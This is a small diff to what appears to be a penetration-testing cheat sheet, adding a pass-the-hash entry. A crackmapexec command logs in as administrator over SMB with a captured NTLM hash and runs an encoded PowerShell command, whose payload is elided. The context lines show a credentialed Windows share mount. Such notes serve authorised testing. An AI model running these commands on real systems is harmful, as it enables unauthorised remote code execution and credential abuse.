@@ -104,6 +104,12 @@ Mount windows share:
 sudo mount -o username=$USER,password=$PASSWORD -t cifs \\\\$TARGET_IP\$SHARE /mnt
 ```
 
+wmiexec with hash:
+#pass-the-hash #pth 
+```bash
+crackmapexec smb -u administrator -H $HASH -X "powershell -e ..."
+```
+
 Try to connect to console:
 
 ```shell
